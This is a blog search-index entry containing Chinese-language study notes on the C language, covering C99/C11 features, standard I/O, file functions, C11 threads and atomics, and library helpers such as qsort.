<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>C</title>
    <url>/2020/04/07/C/C/</url>
    <content><![CDATA[<p>…</p>
<span id="more"></span>


<p><a href="http://c.biancheng.net/sitemap/">参考文档</a></p>
<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>需要GCC，可以使用<a href="http://mingw-w64.org/doku.php">MinGW-w64</a>，并配置<code>/bin</code>目录到环境变量。<br>编译文件使用命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">gcc main.c</span><br><span class="line">gcc main.c -o main.out</span><br></pre></td></tr></table></figure>

<p>注意：在VC与GCC上，对于<code>long</code>型有关的变量，其长度定义的不一致。</p>
<h2 id="版本历史"><a href="#版本历史" class="headerlink" title="版本历史"></a>版本历史</h2><p>C语言有：C89(90)，C99，C11。</p>
<h3 id="C99"><a href="#C99" class="headerlink" title="C99"></a>C99</h3><p>新增关键字：<code>_Bool</code>,<code> _Complex</code>, <code>_Imaginary</code>, <code>inline</code>, <code>restrict</code><br>复合字面量：初始化结构的时候允许对特定的元素赋值，<code>struct test&#123;int a, b, c, d;&#125; foo = &#123; .a = 1, .c = 3, 4, .b = 5 &#125;; </code>。<br>格式化字符串中，利用 \u 支持 unicode 的字符。<br>修改了 &#x2F;% 处理负数时的定义，这样可以给出明确的结果，例如在C89中-22 &#x2F; 7 &#x3D; -3, -22% 7 &#x3D; -1，也可以-22 &#x2F; 7&#x3D; -4, -22% 7 &#x3D; 6。 而C99中明确为 -22 &#x2F; 7 &#x3D; -3, -22% 7 &#x3D; -1，只有一种结果。</p>
<h3 id="C11"><a href="#C11" class="headerlink" title="C11"></a>C11</h3><p>新增关键字：<code>_Alignas</code>, <code>_Alignof</code>, <code>_Atomic</code>, <code>_Generic</code>, <code>_Noreturn</code>, <code>_Static_assert</code>, <code>_Thread_local</code>。</p>
<p><code>alignof(T)</code>返回T的对齐方式，<code>aligned_alloc()</code>以指定字节和对齐方式分配内存，头文件<code>&lt;stdalign.h&gt;</code>定义了这些内容。<br><code>fopen()</code>增加了新的创建、打开模式<code>x</code>，在文件锁中比较常用。<br><code>quick_exit()</code>,又一种终止程序的方式，当<code>exit()</code>失败时用以终止程序。<br>多线程：头文件<code>&lt;threads.h&gt;</code>定义了创建和管理线程的函数，新的存储类修饰符<code>_Thread_local</code>限定了变量不能在多线程之间共享。<br><code>_Atomic</code>类型修饰符和头文件<code>&lt;stdatomic.h&gt;</code>。<br>改进的Unicode支持和头文件<code>&lt;uchar.h&gt;</code>。</p>
<h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><p>前缀：<code>0x</code>表示十六进制，<code>0</code>表示八进制，默认是十进制。<br>后缀：<code>u</code>表示无符号，<code>l</code>表示长整数。<br>size_t：64位中表示<code>long long unsigned int</code>，非64位中为<code>long unsigned int</code>。size_t大于等于地址线宽度。是sizeof的返回类型，就是表示一个size。<br>ptrdiff_t：用来保存两个指针减法操作的结果。</p>
<h2 id="字符串常用函数"><a href="#字符串常用函数" class="headerlink" title="字符串常用函数"></a>字符串常用函数</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">strcpy</span>(s1, s2);  <span class="comment">// 复制s2到s1</span></span><br><span class="line"><span class="built_in">strcat</span>(s1, s2);  <span class="comment">// 连接s2到s1末端</span></span><br><span class="line"><span class="built_in">strlen</span>(s);       <span class="comment">// s长度</span></span><br><span class="line"><span class="built_in">strcmp</span>(s1, s2);  <span class="comment">// 比较</span></span><br><span class="line"><span class="built_in">strchr</span>(s, ch);   <span class="comment">// 查找ch位置</span></span><br><span class="line"><span class="built_in">strstr</span>(s1, s2);  <span class="comment">// 查找子串s2位置</span></span><br></pre></td></tr></table></figure>

<h2 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h2><p>结构体在函数传参中可以值传递，也可以地址传递。值传递时，不会改变原有的结构体，也就是调用时，结构体被复制了一份。</p>
<h2 id="位域"><a href="#位域" class="headerlink" title="位域"></a>位域</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">bs</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> a:<span class="number">4</span>;</span><br><span class="line">    <span class="type">unsigned</span>  :<span class="number">4</span>;    <span class="comment">/* 空域 */</span></span><br><span class="line">    <span class="type">unsigned</span> b:<span class="number">4</span>;    <span class="comment">/* 从下一单元开始存放 */</span></span><br><span class="line">    <span class="type">unsigned</span> c:<span class="number">4</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="标准输入输出"><a href="#标准输入输出" class="headerlink" title="标准输入输出"></a>标准输入输出</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 返回值表示读取成功的变量数，为EOF表示读取结束</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">scanf</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *format, ...)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *format, ...)</span></span>;</span><br></pre></td></tr></table></figure>

<p>占位修饰符：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;%+&quot;</span> 显示正负</span><br><span class="line"><span class="string">&quot;%-&quot;</span> 左对齐</span><br><span class="line"><span class="string">&quot;% &quot;</span> 显示负或空</span><br><span class="line"><span class="string">&quot;%#&quot;</span> 显示进制格式，科学计数格式</span><br><span class="line"><span class="string">&quot;%0&quot;</span> <span class="number">0</span>填充前导数值</span><br><span class="line"><span class="string">&quot;%4&quot;</span> <span class="string">&quot;%*&quot;</span> 字宽最小值，*表示从参数中获取</span><br><span class="line"><span class="string">&quot;%5.2f&quot;</span> 保留几位小数和整数</span><br><span class="line"><span class="string">&quot;%6.4hd&quot;</span> <span class="type">short</span> <span class="type">int</span> / <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span>, hhd 表示 <span class="type">char</span>/uchar</span><br><span class="line"><span class="string">&quot;%j&quot;</span> <span class="type">int</span> uint</span><br><span class="line"><span class="string">&quot;%l&quot;</span> <span class="type">long</span></span><br><span class="line"><span class="string">&quot;%ll&quot;</span> <span class="type">long</span> <span class="type">long</span></span><br><span class="line"><span class="string">&quot;%L&quot;</span> <span class="type">long</span> <span class="type">double</span></span><br><span class="line"><span class="string">&quot;%t&quot;</span> 表示 <span class="type">ptrdiff_t</span></span><br><span class="line"><span class="string">&quot;%z&quot;</span> 表示 <span class="type">size_t</span></span><br></pre></td></tr></table></figure>

<h2 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">FILE *<span class="title">fopen</span><span class="params">( <span class="type">const</span> <span class="type">char</span> * filename, <span class="type">const</span> <span class="type">char</span> * mode )</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">fclose</span><span class="params">( FILE *fp )</span></span>;  <span class="comment">// 成功返回0，错误返回EOF</span></span><br><span class="line"><span class="comment">// 读取一个字符，错误返回EOF</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">fgetc</span><span class="params">( FILE * fp )</span></span>;</span><br><span class="line"><span class="comment">// 读取n-1个字符到buf，并在buf末尾追加null</span></span><br><span class="line"><span class="function"><span class="type">char</span> *<span class="title">fgets</span><span class="params">( <span class="type">char</span> *buf, <span class="type">int</span> n, FILE *fp )</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">fscanf</span><span class="params">(FILE *fp, <span class="type">const</span> <span class="type">char</span> *format, ...)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">fputc</span><span class="params">( <span class="type">int</span> c, FILE *fp )</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">fputs</span><span class="params">( <span class="type">const</span> <span class="type">char</span> *s, FILE *fp )</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">fprintf</span><span class="params">(FILE *fp,<span class="type">const</span> <span class="type">char</span> *format, ...)</span></span>;</span><br><span class="line"><span class="comment">// 二进制I/O函数，用于读写存储块</span></span><br><span class="line"><span class="function"><span class="type">size_t</span> <span class="title">fread</span><span class="params">(<span class="type">void</span> *ptr, <span class="type">size_t</span> size_of_elements, </span></span></span><br><span class="line"><span class="params"><span class="function">             <span class="type">size_t</span> number_of_elements, FILE *a_file)</span></span>;</span><br><span class="line">              </span><br><span class="line"><span class="function"><span class="type">size_t</span> <span class="title">fwrite</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *ptr, <span class="type">size_t</span> size_of_elements, </span></span></span><br><span class="line"><span class="params"><span class="function">             <span class="type">size_t</span> number_of_elements, FILE *a_file)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">feof</span> <span class="params">( FILE * fp )</span></span>; <span class="comment">// 判断是否到结尾</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">ferror</span> <span class="params">( FILE *fp )</span></span>; <span class="comment">// 判断是否出错</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">rewind</span> <span class="params">( FILE *fp )</span></span>;<span class="comment">// 移动指针到开头</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">fseek</span> <span class="params">( FILE *fp, <span class="type">long</span> offset, <span class="type">int</span> origin )</span></span>; <span class="comment">// 移动指针到某个位置</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">ftell</span> <span class="params">( FILE * fp )</span></span>; <span class="comment">// 文件长度</span></span><br></pre></td></tr></table></figure>

<p>FILE结构体为</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义FILE结构体</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_iobuf</span> &#123;</span><br><span class="line">    <span class="type">int</span> cnt; <span class="comment">// 剩余的字符，如果是输入缓冲区，那么就表示缓冲区中还有多少个字符未被读取</span></span><br><span class="line">    <span class="type">char</span> *ptr; <span class="comment">// 下一个要被读取的字符的地址</span></span><br><span class="line">    <span class="type">char</span> *base; <span class="comment">// 缓冲区基地址</span></span><br><span class="line">    <span class="type">int</span> flag; <span class="comment">// 读写状态标志位</span></span><br><span class="line">    <span class="type">int</span> fd; <span class="comment">// 文件描述符</span></span><br><span class="line">&#125; FILE;</span><br></pre></td></tr></table></figure>


<h2 id="预定义宏"><a href="#预定义宏" class="headerlink" title="预定义宏"></a>预定义宏</h2><p><code>__DATE__</code>	当前日期，一个以 “MMM DD YYYY” 格式表示的字符常量。<br><code>__TIME__</code>	当前时间，一个以 “HH:MM:SS” 格式表示的字符常量。<br><code>__FILE__</code>	这会包含当前文件名，一个字符串常量。<br><code>__LINE__</code>	这会包含当前行号，一个十进制常量。<br><code>__STDC__</code>	当编译器以 ANSI 标准编译时，则定义为 1。<br>字符串常量化运算符（#）：转化常量为字符串<br>标记粘贴运算符（##）：拼接合并变量<br>#pragma：使用标准化方法，向编译器发布特殊的命令到编译器中</p>
<h2 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> errno; <span class="comment">// 保存错误信息</span></span><br><span class="line"><span class="built_in">perror</span>(<span class="string">&quot;An error occered&quot;</span>)  <span class="comment">// 返回传入的字符串，并追加一个冒号和空格</span></span><br><span class="line"><span class="built_in">strerror</span>(errno)  <span class="comment">// 返回一个指针，指向errno代表的文本</span></span><br><span class="line">stderr <span class="comment">// 用来输入错误信息的文件流</span></span><br><span class="line"><span class="comment">// 例如</span></span><br><span class="line"><span class="built_in">fprintf</span>(stderr, <span class="string">&quot;错误号: %d\n&quot;</span>, errno);</span><br><span class="line"><span class="built_in">perror</span>(<span class="string">&quot;通过 perror 输出错误&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(stderr, <span class="string">&quot;打开文件错误: %s\n&quot;</span>, <span class="built_in">strerror</span>(errno));</span><br><span class="line"><span class="comment">// 退出</span></span><br><span class="line"><span class="built_in">exit</span>(EXIT_SUCCESS); <span class="comment">// 正常退出</span></span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE); <span class="comment">// 不正常退出</span></span><br></pre></td></tr></table></figure>

<h2 id="可变参数"><a href="#可变参数" class="headerlink" title="可变参数"></a>可变参数</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">func</span><span class="params">(<span class="type">int</span>, ... )</span></span>&#123;</span><br><span class="line">    va_list valist;</span><br><span class="line">    <span class="comment">/* 为 num 个参数初始化 valist */</span></span><br><span class="line">    <span class="built_in">va_start</span>(valist, num);</span><br><span class="line">    <span class="comment">/* 访问所有赋给 valist 的参数 */</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num; i++)&#123;</span><br><span class="line">       sum += <span class="built_in">va_arg</span>(valist, <span class="type">int</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 清理为 valist 保留的内存 */</span></span><br><span class="line">    <span class="built_in">va_end</span>(valist);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> *<span class="title">calloc</span><span class="params">(<span class="type">int</span> num, <span class="type">int</span> size)</span></span>;  <span class="comment">// 在堆区动态分配 num 个长度为 size 的连续空间 + 初始化为 0</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">free</span><span class="params">(<span class="type">void</span> *address)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> *<span class="title">malloc</span><span class="params">(<span class="type">int</span> num)</span></span>;  <span class="comment">// 在堆区分配，不会初始化</span></span><br><span class="line"><span class="function"><span class="type">void</span> *<span class="title">realloc</span><span class="params">(<span class="type">void</span> *address, <span class="type">int</span> newsize)</span></span>;  <span class="comment">// 重新分配</span></span><br></pre></td></tr></table></figure>

<h2 id="命令行参数"><a href="#命令行参数" class="headerlink" title="命令行参数"></a>命令行参数</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// argv 第0个 文件名，第1个，首个参数</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">( <span class="type">int</span> argc, <span class="type">char</span> *argv[] )</span> </span></span><br></pre></td></tr></table></figure>

<p>Linux 下我们可使用 getopt 和 getopt_long 来对命令行参数进行解析：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    <span class="type">char</span> *optstr = <span class="string">&quot;p:n:m:c:&quot;</span>;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">option</span> opts[] = &#123;</span><br><span class="line">        &#123;<span class="string">&quot;path&quot;</span>, <span class="number">1</span>, <span class="literal">NULL</span>, <span class="string">&#x27;p&#x27;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;name&quot;</span>, <span class="number">1</span>, <span class="literal">NULL</span>, <span class="string">&#x27;n&#x27;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;mtime&quot;</span>, <span class="number">1</span>, <span class="literal">NULL</span>, <span class="string">&#x27;m&#x27;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;ctime&quot;</span>, <span class="number">1</span>, <span class="literal">NULL</span>, <span class="string">&#x27;c&#x27;</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">int</span> opt;</span><br><span class="line">    <span class="keyword">while</span>((opt = <span class="built_in">getopt_long</span>(argc, argv, optstr, opts, <span class="literal">NULL</span>)) != <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="keyword">switch</span>(opt) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;p&#x27;</span>: <span class="comment">// ...</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">findInDir</span>(path);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="虚内存模型"><a href="#虚内存模型" class="headerlink" title="虚内存模型"></a>虚内存模型</h2><p>Linux：<br>由低地址到高地址分别为：保留区，代码区，常量区，全局变量区，堆（以及未分配内存），动态链接库，（未分配内存以及）栈（向低地址增长）内核空间。</p>
<p><a href="https://blog.csdn.net/embedded_sky/article/details/44457453">Windows</a></p>
<h2 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h2><p><a href="http://c.biancheng.net/c/120/">参考文档</a></p>
<p>在头文件 <code>threads.h</code> 中，定义和声明了支持多线程的宏、类型和函数。所有直接与线程相关的标识符，均以前缀 <code>thrd_</code> 作为开头。</p>
<p>线程操作：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建并开始执行一个新线程</span></span><br><span class="line"><span class="comment">// thr: thrd_t 类型</span></span><br><span class="line"><span class="comment">// func: 例如 int parallel_sum(void *arg)</span></span><br><span class="line"><span class="comment">// arg: 指向参数的指针</span></span><br><span class="line"><span class="comment">// 返回值: 是否创建成功 thrd_success</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">thrd_create</span><span class="params">(<span class="type">thrd_t</span> *thr, <span class="type">thrd_start_t</span> func, <span class="type">void</span> *arg)</span></span>;</span><br><span class="line"><span class="comment">// 阻塞等待某线程</span></span><br><span class="line"><span class="comment">// result: 线程返回值</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">thrd_join</span><span class="params">(<span class="type">thrd_t</span> thr, <span class="type">int</span> *result)</span></span>;</span><br><span class="line"><span class="comment">// 当线程 thr 执行完成后，自动释放线程占用的所有资源</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">thrd_detach</span><span class="params">(<span class="type">thrd_t</span> thr)</span></span>;</span><br><span class="line"><span class="comment">// 返回其所在线程的线程标识。</span></span><br><span class="line"><span class="function"><span class="type">thrd_t</span> <span class="title">thrd_current</span><span class="params">(<span class="type">void</span>)</span></span>;</span><br><span class="line"><span class="comment">// 两个线程标识符 thr0、thr1 分别引用了两个不同线程时，返回 0。</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">thrd_equal</span><span class="params">(<span class="type">thrd_t</span> thr0, <span class="type">thrd_t</span> thr1)</span></span>;</span><br><span class="line"><span class="comment">// 使得正在调用的线程等待一段时间。仅当该函数收到唤醒的信号时，它才提前返回。</span></span><br><span class="line"><span class="comment">// duration: 等待时间</span></span><br><span class="line"><span class="comment">// remaining: 剩余时间</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">thrd_sleep</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> timespec*duration, <span class="keyword">struct</span> timespec*remaining)</span></span>;</span><br><span class="line"><span class="comment">// 尝试中断当前调用的线程，并将 CPU 时间分给另一个线程。</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">thrd_yield</span><span class="params">(<span class="type">void</span>)</span></span>;</span><br><span class="line"><span class="comment">// 以 result 作为结果值结束正在调用线程。</span></span><br><span class="line"><span class="function">_Noreturn <span class="type">void</span> <span class="title">thrd_exit</span><span class="params">(<span class="type">int</span> result)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">timespec</span>&#123;</span><br><span class="line">    <span class="type">time_t</span> tv_sec;   <span class="comment">// 秒≥0</span></span><br><span class="line">    <span class="type">long</span>   tv_nsec;  <span class="comment">// 0 ≤纳秒≤999 999 999</span></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>当每个线程为各自的变量使用全局标识符时，为保留这些变量各自的数据，可以采用线程对象和线程存储。</p>
<p>线程对象（全局或静态对象）：每一个线程拥有属于自己的线程对象实例（不共享）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">thread_local</span> <span class="type">int</span> var = <span class="number">10</span>;</span><br></pre></td></tr></table></figure>

<p>线程存储：线程内部使用。<br>通过初始创建一个全局的键（key）表示一个指向线程存储的指针。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建Key</span></span><br><span class="line"><span class="comment">// dtor: 例如 void destructor(void *data);  用作析构函数</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">tss_create</span><span class="params">(<span class="type">tss_t</span> *key, <span class="type">tss_dtor_t</span> dtor)</span></span>;</span><br><span class="line"><span class="comment">// 删除Key</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">tss_delete</span><span class="params">(<span class="type">tss_t</span> key)</span></span>;</span><br><span class="line"><span class="comment">// 设置key所表示的tss指针为val引用的内存地址</span></span><br><span class="line"><span class="comment">// val: 例如 malloc(size)</span></span><br><span class="line"><span class="comment">// 返回thrd_error或者thrd_success</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">tss_set</span><span class="params">(<span class="type">tss_t</span> key, <span class="type">void</span>*val)</span></span>;</span><br><span class="line"><span class="comment">// 返回内存块指针</span></span><br><span class="line"><span class="comment">// 返回thrd_error或者thrd_success</span></span><br><span class="line"><span class="function"><span class="type">void</span>* <span class="title">tss_get</span><span class="params">(<span class="type">tss_t</span> key)</span></span>;</span><br></pre></td></tr></table></figure>

<p>线程间通信：使用条件变量，以等待来自另一个线程的通知。互斥要自行实现。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建条件变量</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">cnd_init</span><span class="params">(<span class="type">cnd_t</span> *cond)</span></span>;</span><br><span class="line"><span class="comment">// 释放资源</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">cnd_destroy</span><span class="params">(<span class="type">cnd_t</span> *cond)</span></span>;</span><br><span class="line"><span class="comment">// 在等待条件变量的线程中唤醒一个</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">cnd_signal</span><span class="params">(<span class="type">cnd_t</span> *cond)</span></span>;</span><br><span class="line"><span class="comment">// 唤醒所有等待指定条件变量的线程</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">cnd_broadcast</span><span class="params">(<span class="type">cnd_t</span> *cond)</span></span>;</span><br><span class="line"><span class="comment">// 阻塞正在调用的线程，并释放指定的互斥。</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">cnd_wait</span><span class="params">(<span class="type">cnd_t</span> *cond, <span class="type">mtx_t</span> *mtx)</span></span>;</span><br><span class="line"><span class="comment">// 阻塞正在调用的线程，但仅维持由参数 ts 指定的时间</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">cnd_timedwait</span><span class="params">(<span class="type">cnd_t</span> *restrict cond，<span class="type">mtx_t</span> *restrict mtx，<span class="type">const</span> <span class="keyword">struct</span> timespec *restrict ts)</span></span>;</span><br></pre></td></tr></table></figure>

<p>互斥操作：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 初始化互斥锁</span></span><br><span class="line"><span class="comment">// mutextype: </span></span><br><span class="line"><span class="comment">// - mtx_plain 既不支持超时也不支持递归</span></span><br><span class="line"><span class="comment">// - mtx_timed 支持超时</span></span><br><span class="line"><span class="comment">// - mtx_plain | mtx_recursive</span></span><br><span class="line"><span class="comment">// - mtx_timed | mtx_recursive</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">mtx_init</span><span class="params">(<span class="type">mtx_t</span> *mtx, <span class="type">int</span> mutextype)</span></span>;</span><br><span class="line"><span class="comment">// 释放资源</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">mtx_destroy</span><span class="params">(<span class="type">mtx_t</span> *mtx)</span></span>;</span><br><span class="line"><span class="comment">// 上锁，阻塞当前进程</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">mtx_lock</span><span class="params">(<span class="type">mtx_t</span> *mtx)</span></span>;</span><br><span class="line"><span class="comment">// 解锁</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">mtx_unlock</span><span class="params">(<span class="type">mtx_t</span> *mtx)</span></span>;</span><br></pre></td></tr></table></figure>


<p>原子对象与原子操作：<code>stdatomic.h</code></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 声明一个原子对象，数组和函数类型不能为原子类型。</span></span><br><span class="line"><span class="comment">// 原子对象的初始化不是一个原子操作。</span></span><br><span class="line">_Atomic <span class="type">long</span> counter = <span class="built_in">ATOMIC_VAR_INIT</span>(<span class="number">0L</span>);</span><br><span class="line">_Atomic <span class="type">long</span> counter = <span class="built_in">ATOMIC_INIT</span>(<span class="number">0L</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 原子操作</span></span><br><span class="line"><span class="built_in">atomic_store</span>();</span><br><span class="line"><span class="built_in">atomic_exchange</span>();</span><br><span class="line"><span class="built_in">atomic_compare_exchange_strong</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 开始和结束操作原子对象</span></span><br><span class="line"><span class="built_in">atomic_flag_test_and_set</span>();</span><br><span class="line"><span class="built_in">atomic_flag_clear</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断原子对象是否无锁（0有锁，1无锁，2始终无锁）</span></span><br><span class="line"><span class="function">_Bool <span class="title">atomic_is_lock_free</span><span class="params">(<span class="type">const</span> <span class="keyword">volatile</span> A *obj)</span></span>;</span><br></pre></td></tr></table></figure>

<p>内存次序：使用原子对象可以默认地防止此类重新排序。但是在较低的内存次序请求下，通过明确地使用原子操作提高性能。</p>
<p>每个原子操作的函数都有一个以 <code>_explicit</code> 结尾版本。如<code>atomic_store_explicit()</code>。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">memory_order</span> &#123;</span><br><span class="line">    <span class="comment">// 编译器可以自由地改变操作的顺序</span></span><br><span class="line">    memory_order_relaxed, </span><br><span class="line">    <span class="comment">// 原子对象释放操作</span></span><br><span class="line">    memory_order_release, </span><br><span class="line">    <span class="comment">// 原子对象捕获操作</span></span><br><span class="line">    memory_order_acquire,</span><br><span class="line">    <span class="comment">// 消耗操作</span></span><br><span class="line">    memory_order_consume,</span><br><span class="line">    <span class="comment">// 同时具有捕获和释放操作</span></span><br><span class="line">    memory_order_acq_rel,</span><br><span class="line">    <span class="comment">// 顺序一致性</span></span><br><span class="line">    memory_order_seq_cst,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 例如</span></span><br><span class="line"><span class="built_in">atomic_store_explicit</span>(&amp;aptr, (<span class="type">intptr_t</span>)&amp;data,memory_order_release);</span><br><span class="line">dp = (<span class="keyword">struct</span> Data*)<span class="built_in">atomic_load_explicit</span>(&amp;aptr,</span><br><span class="line">memory_order_acquire);  </span><br></pre></td></tr></table></figure>

<p>内存屏障（栅栏）：对于一个原子操作的内存次序请求，也可以通过一个原子操作单独指定。栅栏允许更大程度的内存顺序优化。<br>若参数值为 memory_order_release，函数 atomic_thread_fence（）建立一个释放栅栏（releas fence）。在这种情况下，原子写操作必须在释放栅栏之后发生。<br>若参数值为 memory_order_acquire 或 memory_order_consume，函数 atomic_thread_fence（）建立一个捕获栅栏（acquire fence）。在这种情况下，原子读操作必须在捕获栅栏之前发生。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">atomic_thread_fence</span><span class="params">(memory_order order)</span></span>;</span><br></pre></td></tr></table></figure>


<h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// C 内置排序算法 stdlib.h 中</span></span><br><span class="line"><span class="built_in">qsort</span>(arr.<span class="built_in">data</span>(), ARRAY_SIZE，<span class="built_in">sizeof</span>(<span class="type">int</span>), comp_function [a&gt;b +, a&lt;b -, a=b <span class="number">0</span>])</span><br><span class="line"><span class="comment">// C 内置二分搜索 stdlib.h 中，返回指向元素的指针</span></span><br><span class="line"><span class="type">void</span> *p = <span class="built_in">bsearch</span>(&amp;target, arr.<span class="built_in">data</span>(), ARRAY_SIZE, <span class="built_in">sizeof</span>(<span class="type">int</span>), comp_function);</span><br><span class="line"></span><br><span class="line"><span class="comment">// C 内置计时器 time.h</span></span><br><span class="line"><span class="type">clock_t</span> clk = <span class="built_in">clock</span>();  <span class="comment">// 返回当前时间，毫秒</span></span><br><span class="line"><span class="comment">// 格式化输出到内存</span></span><br><span class="line"><span class="built_in">snprintf</span>(buf, <span class="number">10</span>, <span class="string">&quot;%d&quot;</span>, x);</span><br></pre></td></tr></table></figure>


